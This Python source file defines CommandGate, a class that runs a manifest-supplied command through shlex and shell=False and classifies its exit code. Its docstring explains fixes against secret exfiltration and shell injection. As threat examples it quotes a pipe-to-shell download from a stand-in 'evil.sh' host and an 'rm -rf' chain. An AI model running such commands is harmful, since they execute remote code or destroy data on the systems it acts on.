"""
CommandGate — runs an arbitrary shell command as a gate.

Classifies the subprocess exit code into exactly one of three outcomes:
  - exit 0                    -> Verdict(passed=True, ...)
  - exit in expected_fail_codes -> Verdict(passed=False, ...)  (a NORMAL
    gate fail, e.g. pytest's exit 1 — the gate ran, the check did not pass)
  - any other exit code        -> GateError (the gate itself could not run,
    e.g. 127 command-not-found, 126 permission denied, 137 SIGKILL)

 security fix: the previous design merged the FULL parent
environment (**os.environ) into every gate subprocess. Combined with
`gate.run` being loop-author-supplied (bounded-loops explicitly invites
community loop PRs), this let a malicious loop.yaml exfiltrate any secret
in the invoking shell/CI with a one-line command. Fixed by allowlisting:
only a small set of variables a subprocess genuinely needs, plus whatever
ctx.env explicitly opts into passing through (never automatic).

Shell-injection hardening:
`cmd` is sourced from `loop.yaml: gate.run` — a string in a folder
bounded-loops explicitly invites as a community PR, i.e. attacker-
influenceable. The previous design ran it with `shell=True`, so a
malicious `gate.run: "curl https://evil.sh | sh"` (or `rm -rf ... && true`)
was executed verbatim by `/bin/sh -c`. The env allowlist stops *secret
exfiltration* but NOT arbitrary command chaining. Fixed here the same way
's ShellRunner already was: tokenize with `shlex.split()` and run
with `shell=False`, so shell metacharacters (`|`, `&&`, `;`, `$()`, `>`)
in a hostile manifest are NEVER reinterpreted by an intermediate shell —
`curl evil | sh` becomes argv `["curl", "evil", "|", "sh"]`, no pipe.

A gate that genuinely needs shell features (pipes, `&&`) ships a wrapper
script IN ITS OWN loop folder (reviewable, copied into the scratch
workspace) and points `gate.run` at it — e.g. `gate.run: "bash gate.sh"`.
This is safe-by-default with an explicit, visible escape hatch, exactly
like ShellRunner's contract. NOTE: `shell=False` removes the *injection/
chaining* class; it does not sandbox the single named binary. Exit-0-as-truth remains CommandGate's
documented contract for arbitrary commands — for real output validation
use a typed gate (pytest / jsonschema / osv / checkov), which parse.
"""

from __future__ import annotations

import shlex
import subprocess

from bounded_loops.adapters._env import ENV_ALLOWLIST, build_subprocess_env
from bounded_loops.domain.errors import GateError
from bounded_loops.domain.models import LoopContext, Verdict

# ── Security fix: environment allowlist ─────────────────────────────
# Mirrors adapters/runners/shell.py's _build_subprocess_env exactly
# — same function, duplicated here since command.py and shell.py are owned
# by different modules and neither imports the other.
_ENV_ALLOWLIST = ENV_ALLOWLIST  # single source: adapters/_env.py


def _build_subprocess_env(ctx_env: dict[str, str]) -> dict[str, str]:
    return build_subprocess_env(ctx_env)


class CommandGate:
    """Runs `cmd` via subprocess; classifies exit code into pass/fail/error."""

    cmd: str
    expected_fail_codes: frozenset[int]
    timeout_s: int

    def __init__(
        self,
        cmd: str,
        expected_fail_codes: frozenset[int] | set[int] = frozenset({1}),
        timeout_s: int = 120,
    ) -> None:
        if not cmd or not cmd.strip():
            raise ValueError("CommandGate: cmd must be a non-empty string")
        self.cmd = cmd
        self.expected_fail_codes = frozenset(expected_fail_codes)
        self.timeout_s = timeout_s

    def check(self, ctx: LoopContext) -> Verdict:
        # Tokenize with shlex + shell=False: shell
        # metacharacters in an attacker-influenced manifest are never
        # reinterpreted by an intermediate shell. Malformed quoting (e.g. an
        # unterminated quote) surfaces as GateError, not a raw ValueError.
        try:
            argv = shlex.split(self.cmd)
        except ValueError as exc:
            raise GateError(
                f"CommandGate: could not parse gate command {self.cmd!r}: {exc}. "
                f"A gate needing shell features (pipes, &&) must ship a wrapper "
                f"script in its loop folder and set gate.run to run that script."
            ) from exc
        if not argv:
            raise GateError(f"CommandGate: gate command {self.cmd!r} is empty after parsing")

        try:
            proc = subprocess.run(
                argv,
                cwd=str(ctx.workspace),
                shell=False,
                capture_output=True,
                text=True,
                timeout=self.timeout_s,
                env=_build_subprocess_env(ctx.env),
            )
        except subprocess.TimeoutExpired as exc:
            raise GateError(
                f"CommandGate: command timed out after {self.timeout_s}s. "
                f"cmd={self.cmd!r}"
            ) from exc
        except OSError as exc:
            raise GateError(
                f"CommandGate: OS error launching command {self.cmd!r}: {exc}"
            ) from exc

        code = proc.returncode
        stdout = proc.stdout or ""
        stderr = proc.stderr or ""
        combined_output = stdout + ("\n[stderr]\n" + stderr if stderr.strip() else "")

        if code == 0:
            return Verdict(
                passed=True,
                detail="gate passed (exit 0)",
                evidence={
                    "cmd": self.cmd,
                    "code": 0,
                    "tail": combined_output[-2000:],
                },
            )

        if code in self.expected_fail_codes:
            return Verdict(
                passed=False,
                detail=f"gate failed (exit {code})",
                evidence={
                    "cmd": self.cmd,
                    "code": code,
                    "tail": combined_output[-2000:],
                },
            )

        # Unexpected exit code — the gate itself could not run.
        raise GateError(
            f"CommandGate: command exited with unexpected code {code} "
            f"(not in expected_fail_codes={sorted(self.expected_fail_codes)}). "
            f"This means the gate could not run, not that it failed. "
            f"cmd={self.cmd!r} stderr={proc.stderr[-500:]!r}"
        )
